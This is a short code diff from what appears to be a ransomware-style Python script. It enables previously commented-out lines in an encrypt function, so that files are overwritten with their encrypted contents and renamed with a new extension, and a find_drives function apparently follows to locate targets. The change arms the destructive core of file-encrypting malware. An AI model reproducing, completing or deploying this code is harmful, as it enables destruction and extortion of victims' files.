@@ -68,9 +68,9 @@ def encrypt(item, key):
     with open(item, 'rb') as file:
         file_data = file.read()
     encrypted_data = f.encrypt(file_data)
-    # with open(item, 'wb') as file:
-        # file.write(encrypted_data)
-    # os.rename(item, item + '.' + extension)
+    with open(item, 'wb') as file:
+        file.write(encrypted_data)
+    os.rename(item, item + '.' + extension)
 
 def find_drives():
     L = set()
